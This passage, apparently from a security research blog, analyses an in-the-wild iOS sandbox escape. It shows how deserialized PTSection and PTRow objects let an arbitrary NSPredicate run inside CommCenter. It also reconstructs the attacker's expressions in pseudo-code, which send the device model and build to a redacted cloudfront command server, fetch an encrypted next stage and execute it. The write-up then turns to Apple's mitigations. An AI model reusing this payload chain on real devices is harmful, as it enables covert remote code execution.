 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">}</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span>So sending a serialized </span><span class="YDzVciBUld-c0">AVSpeechSynthesisVoice</span><span>&nbsp;object will cause </span><span class="YDzVciBUld-c0">CommCenter</span><span>&nbsp;to load the </span><span class="YDzVciBUld-c0">/System/Library/AccessibilityBundles/AXSpeechImplementation.bundle</span><span>&nbsp;library. With some scripting using otool -L to list dependencies we can &nbsp;find the following dependency chain from </span><span class="YDzVciBUld-c0">AXSpeechImplementation.bundle</span><span>&nbsp;to </span><span class="YDzVciBUld-c0">PrototypeTools.framework</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">:</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">[&#39;/System/Library/AccessibilityBundles/\</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; AXSpeechImplementation.bundle/AXSpeechImplementation&#39;,</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp;&#39;/System/Library/AccessibilityBundles/\</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; AXSpeechImplementation.bundle/AXSpeechImplementation&#39;,</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp;&#39;/System/Library/PrivateFrameworks/\</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; AccessibilityUtilities.framework/AccessibilityUtilities&#39;,</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp;&#39;/System/Library/PrivateFrameworks/\</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; AccessibilitySharedSupport.framework/AccessibilitySharedSupport&#39;,</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&#39;/System/Library/PrivateFrameworks/Sharing.framework/Sharing&#39;,</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&#39;/System/Library/PrivateFrameworks/\</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; PrototypeTools.framework/PrototypeTools&#39;]</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span>This explains how the deserialization of a </span><span class="YDzVciBUld-c0">PTSection</span><span>&nbsp;will succeed. But what&#39;s so special about </span><span class="YDzVciBUld-c0">PTSections</span><span>&nbsp;and </span><span class="YDzVciBUld-c0">PTRows</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">?</span></p><h2 class="YDzVciBUld-c7" id="h.tsdrbvcjutdl"><span>Predicated Sections</span></h2>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c0">[PTRow initwithcoder:]</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">&nbsp;contains the following snippet:</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; self-&gt;condition = [coder decodeObjectOfClass:NSPredicate</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;forKey:@&quot;condition&quot;]</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; [self-&gt;condition allowEvaluation]</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span>This will deserialize an </span><span class="YDzVciBUld-c0">NSPredicate</span><span>&nbsp;object, assign it to the </span><span class="YDzVciBUld-c0">PTRow</span><span>&nbsp;member variable </span><span class="YDzVciBUld-c0">condition</span><span>&nbsp;and call </span><span class="YDzVciBUld-c0">allowEvaluation</span><span>. This is meant to indicate that the deserializing code considers this predicate safe, but there&#39;s no attempt to perform any validation on the predicate contents here. They then need one more trick to find a path to which will additionally evaluate the </span><span class="YDzVciBUld-c0">PTRow</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">&#39;s condition predicate.</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span>Here&#39;s a snippet from </span><span class="YDzVciBUld-c0">[PTSection initWithCoder:]</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">:</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">NSSet* allowed = [NSSet setWithObjects: @[PTRow]]</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c0">id* rows = [coder </span><span class="YDzVciBUld-c0">decodeObjectOfClasses</span><span class="YDzVciBUld-c2 YDzVciBUld-c0">:allowed forKey:@&quot;rows&quot;]</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c0"></span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">[self initWithRows:rows]</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span>This deserializes an array of </span><span class="YDzVciBUld-c0">PTRows</span><span>&nbsp;and passes them to </span><span class="YDzVciBUld-c0">[PTSection initWithRows]</span><span>&nbsp;which assigns a copy of the array of </span><span class="YDzVciBUld-c0">PTRows</span><span>&nbsp;to</span><span class="YDzVciBUld-c0">&nbsp;PTSection-&gt;rows</span><span>&nbsp;then calls </span><span class="YDzVciBUld-c0">[self </span><span class="YDzVciBUld-c0">_reloadEnabledRows</span><span class="YDzVciBUld-c0">]</span><span>&nbsp;which in turn passes each row to </span><span class="YDzVciBUld-c2 YDzVciBUld-c0">[self _shouldEnableRow:]</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">_shouldEnableRow:row {</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; if (row-&gt;condition) {</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; return [row-&gt;condition evaluateWithObject: self-&gt;settings]</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; }</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">}</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span>And thus, by sending a </span><span class="YDzVciBUld-c0">PTSection</span><span>&nbsp;containing a single </span><span class="YDzVciBUld-c0">PTRow</span><span>&nbsp;with an attached condition </span><span class="YDzVciBUld-c0">NSPredicate</span><span>&nbsp;they can cause the evaluation of an arbitrary </span><span class="YDzVciBUld-c0">NSPredicate</span><span>, effectively equivalent to arbitrary code execution in the context of </span><span class="YDzVciBUld-c0">CommCenter</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">. </span></p><h2 class="YDzVciBUld-c7" id="h.9aaj7tmx81zt"><span class="YDzVciBUld-c9 YDzVciBUld-c3">Payload 2</span></h2>
 <p class="YDzVciBUld-c4"><span>The </span><span class="YDzVciBUld-c0">NSPredicate</span><span>&nbsp;attached to the </span><span class="YDzVciBUld-c0">PTRow</span><span>&nbsp;uses a similar trick to the first payload to cause the evaluation of six independent </span><span class="YDzVciBUld-c0">NSFunctionExpressions</span><span>, but this time in the context of the </span><span class="YDzVciBUld-c0">CommCenter</span><span>&nbsp;process. </span><span>They&#39;re presented here in pseudo Objective-C:</span></p><h3 class="YDzVciBUld-c8" id="h.4c2mqlgknm1m"><span class="YDzVciBUld-c10 YDzVciBUld-c3">Expression 1</span></h3>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">[ &nbsp;[CaliCalendarAnonymizer sharedAnonymizedStrings]</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp;setObject:</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp;@[[NSURLComponents</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;componentsWithString:</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;@&quot;https://cloudfront.net/XXX/XXX/XXX?aaaa&quot;], &#39;0&#39;]</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp;forKey: @&quot;0&quot;</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">]</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span>The use of </span><span class="YDzVciBUld-c0">[CaliCalendarAnonymizer sharedAnonymizedStrings]</span><span>&nbsp;is a trick to enable the array of independent </span><span class="YDzVciBUld-c0">NSFunctionExpressions</span><span>&nbsp;to have &quot;local variables&quot;. In this first case they create an </span><span class="YDzVciBUld-c0 YDzVciBUld-c6"><a class="YDzVciBUld-c111" href="https://developer.apple.com/documentation/foundation/nsurlcomponents">NSURLComponents</a></span><span>&nbsp;object which is used to build parameterised URLs. This URL builder is then stored in the global dictionary returned by </span><span class="YDzVciBUld-c0">[CaliCalendarAnonymizer sharedAnonymizedStrings]</span><span>&nbsp;under the key &quot;</span><span class="YDzVciBUld-c0">0</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">&quot;.</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p><h3 class="YDzVciBUld-c8" id="h.f96qjcb9lnky"><span class="YDzVciBUld-c10 YDzVciBUld-c3">Expression 2</span></h3>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">[[NSBundle</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; bundleWithPath:@&quot;/System/Library/PrivateFrameworks/\</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp;SlideshowKit.framework/Frameworks/OpusFoundation.framework&quot;</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp;] load]</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span>This causes the </span><span class="YDzVciBUld-c0">OpusFoundation</span><span>&nbsp;library to be loaded. The exact reason for this is unclear, though the dependency graph of </span><span class="YDzVciBUld-c0">OpusFoundation</span><span>&nbsp;does include </span><span class="YDzVciBUld-c0">AuthKit</span><span>&nbsp;which is used by the next </span><span class="YDzVciBUld-c0">NSFunctionExpression</span><span>. It&#39;s possible that this payload is generic and might also be expected to work when evaluated in processes where </span><span class="YDzVciBUld-c0">AuthKit</span><span>&nbsp;isn&#39;t loaded.</span></p><h3 class="YDzVciBUld-c8" id="h.o9lhtiv01xpk"><span class="YDzVciBUld-c3 YDzVciBUld-c10">Expression 3</span></h3>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">[ [ [CaliCalendarAnonymizer sharedAnonymizedStrings]</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; objectForKey:@&quot;0&quot; ]</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; setQueryItems:</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; [ [ [NSArray arrayWithObject: </span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[NSURLQueryItem</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; queryItemWithName: @&quot;m&quot;</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; value:[AKDevice _hardwareModel] ]</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;] arrayByAddingObject: </span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[NSURLQueryItem</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; queryItemWithName: @&quot;v&quot;</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; value:[AKDevice _buildNumber] ]</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;] arrayByAddingObject:</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[NSURLQueryItem</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; queryItemWithName: @&quot;u&quot;</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; value:[NSString randomString]]</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">]</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span>This grabs a reference to the </span><span class="YDzVciBUld-c0">NSURLComponents</span><span>&nbsp;object stored under the &quot;</span><span class="YDzVciBUld-c0">0</span><span>&quot; key in the global </span><span class="YDzVciBUld-c0">sharedAnonymizedStrings</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">&nbsp;dictionary then parameterizes the HTTP query string with three values:</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span>&nbsp; </span><span class="YDzVciBUld-c0">[AKDevice _hardwareModel]</span><span>&nbsp;returns a string like &quot;</span><span class="YDzVciBUld-c0">iPhone12,3</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">&quot; which determines the exact device model.</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span>&nbsp; </span><span class="YDzVciBUld-c0">[AKDevice _buildNumber]</span><span>&nbsp;returns a string like &quot;</span><span class="YDzVciBUld-c0">18A8395</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">&quot; which in combination with the device model allows determining the exact firmware image running on the device.</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span>&nbsp; </span><span class="YDzVciBUld-c0">[NSString randomString]</span><span>&nbsp;returns a decimal string representation of a 32-bit random integer like &quot;</span><span class="YDzVciBUld-c0">394681493</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">&quot;.</span></p><h3 class="YDzVciBUld-c8" id="h.ifxeb8zet13e"><span class="YDzVciBUld-c10 YDzVciBUld-c3">Expression 4</span></h3>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">[ [CaliCalendarAnonymizer sharedAnonymizedString]</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; setObject:</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; [NSPropertyListSerialization</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; propertyListWithData:</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; &nbsp; [[[NSData</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;dataWithContentsOfURL:</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;[[[CaliCalendarAnonymizer sharedAnonymizedStrings]</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;objectForKey:@&quot;0&quot;] URL]</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ] AES128DecryptWithPassword:NSData(XXXX)</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;] &nbsp;decompressedDataUsingAlgorithm:3 error:]</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; &nbsp;options: Class(NSConstantValueExpression)</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; format: Class(NSConstantValueExpression)</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; errors:Class(NSConstantValueExpression)</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; ]</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; forKey:@&quot;1&quot;</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">]</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span>The innermost reference to </span><span class="YDzVciBUld-c0">sharedAnonymizedStrings</span><span>&nbsp;here grabs the </span><span class="YDzVciBUld-c0">NSURLComponents</span><span>&nbsp;object and builds the full url from the query string parameters set last earlier. That url is passed to </span><span class="YDzVciBUld-c0">[NSData dataWithContentsOfURL:]</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">&nbsp;to fetch a data blob from a remote server.</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span>That data blob is decrypted with a hardcoded AES128 key, decompressed using zlib then parsed as a plist. That parsed plist is stored in the </span><span class="YDzVciBUld-c0">sharedAnonymizedStrings</span><span>&nbsp;dictionary under the key </span><span class="YDzVciBUld-c0">&quot;1&quot;</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">.</span></p><h3 class="YDzVciBUld-c8" id="h.rmw3ubtmn06v"><span class="YDzVciBUld-c10 YDzVciBUld-c3">Expression 5</span></h3>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">[ [[NSThread mainThread] threadDictionary]</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; addEntriesFromDictionary:</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; [[CaliCalendarAnonymizer sharedAnonymizedStrings]</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; objectForKey:@&quot;1&quot;]</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">]</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c3">This copies all the keys and values from the &quot;next-stage&quot; plist into the main thread&#39;s theadDictionary.</span></p><h3 class="YDzVciBUld-c8" id="h.qzgbnlme8c4b"><span class="YDzVciBUld-c10 YDzVciBUld-c3">Expression 6</span></h3>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">[ [NSExpression expressionWithFormat:</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; [[[CaliCalendarAnonymizer sharedAnonymizedStrings]</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; objectForKey:@&quot;1&quot;]</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; objectForKey: @&quot;a&quot;]</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c0 YDzVciBUld-c2">&nbsp; ]</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; expressionValueWithObject:nil context:nil</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">]</span></p>
 <p class="YDzVciBUld-c4"><span>Finally, this fetches the value of the &quot;</span><span class="YDzVciBUld-c0">a</span><span>&quot; key from the next-stage plist, parses it as an </span><span class="YDzVciBUld-c0">NSExpression</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">&nbsp;string and evaluates it.</span></p><h2 class="YDzVciBUld-c7" id="h.5m5pj8ghutz4"><span class="YDzVciBUld-c9 YDzVciBUld-c3">End of the line</span></h2>
 <p class="YDzVciBUld-c4"><span>At this point we lose the ability to follow the exploit. The attackers have escaped the </span><span class="YDzVciBUld-c0">IMTranscoderAgent</span><span>&nbsp;sandbox, requested a next-stage from the command and control server and executed it, all without any memory corruption or dependencies on particular versions of the operating system.</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span>In response to this exploit</span><span>&nbsp;</span><span class="YDzVciBUld-c6"><a class="YDzVciBUld-c111" href="https://developer.apple.com/documentation/ios-ipados-release-notes/ios-ipados-15_1-release-notes">iOS 15.1 significantly reduced the computational power available to NSExpressions</a></span><span>:</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4 YDzVciBUld-c12"><span class="YDzVciBUld-c3 YDzVciBUld-c13">NSExpression immediately forbids certain operations that have significant side effects, like creating and destroying objects. Additionally, casting string class names into Class objects with NSConstantValueExpression is deprecated.</span></p>
 <p class="YDzVciBUld-c1 YDzVciBUld-c12"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span>In addition the </span><span class="YDzVciBUld-c0">PTSection</span><span>&nbsp;and </span><span class="YDzVciBUld-c0">PTRow</span><span>&nbsp;objects have been hardened with the following check added around the parsing of serialized </span><span class="YDzVciBUld-c0">NSPredicates</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">:</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">if (os_variant_allows_internal_security_policies(</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; &nbsp; &nbsp; &quot;com.apple.PrototypeTools&quot;) {</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">&nbsp; [coder decodeObjectOfClass:NSPredicate forKey:@&quot;condition]</span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c0">...</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span>Object deserialization across trust boundaries still presents an enormous attack surface however</span><span>.</span></p><h2 class="YDzVciBUld-c7" id="h.fyh8k0aja0xk"><span class="YDzVciBUld-c9 YDzVciBUld-c3">Conclusion</span></h2>
 <p class="YDzVciBUld-c4"><span>Perhaps the most striking takeaway is the depth of the attack surface reachable from what would hopefully be a fairly constrained sandbox. With just two tricks (</span><span class="YDzVciBUld-c0">NSObject</span><span>&nbsp;pointers in protocols and library loading gadgets) it&#39;s likely possible to attack almost every </span><span class="YDzVciBUld-c0">initWithCoder</span><span>&nbsp;implementation in the </span><span class="YDzVciBUld-c0">dyld_shared_cache</span><span>. There are presumably many other classes in addition to </span><span class="YDzVciBUld-c0">NSPredicate</span><span>&nbsp;and </span><span class="YDzVciBUld-c0">NSExpression</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">&nbsp;which provide the building blocks for logic-style exploits.</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c3">The expressive power of NSXPC just seems fundamentally ill-suited for use across sandbox boundaries, even though it was designed with exactly that in mind. The attack surface reachable from inside a sandbox should be minimal, enumerable and reviewable. Ideally only code which is required for correct functionality should be reachable; it should be possible to determine exactly what that exposed code is and the amount of exposed code should be small enough that manually reviewing it is tractable. </span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span>NSXPC requiring developers to explicitly add remotely-exposed methods to interface protocols is a great example of how to make the attack surface enumerable - you can at least find all the entry points fairly easily. However the support for inheritance means that the attack surface exposed there likely isn&#39;t reviewable; it&#39;s simply too large for anything beyond a basic</span><span>&nbsp;example</span><span class="YDzVciBUld-c2 YDzVciBUld-c3">.</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
 <p class="YDzVciBUld-c4"><span class="YDzVciBUld-c2 YDzVciBUld-c3">Refactoring these critical IPC boundaries to be more prescriptive - only allowing a much narrower set of objects in this case - would be a good step towards making the attack surface reviewable. This would probably require fairly significant refactoring for NSXPC; it&#39;s built around natively supporting the Objective-C inheritance model and is used very broadly. But without such changes the exposed attack surface is just too large to audit effectively.</span></p>
 <p class="YDzVciBUld-c1"><span class="YDzVciBUld-c2 YDzVciBUld-c3"></span></p>
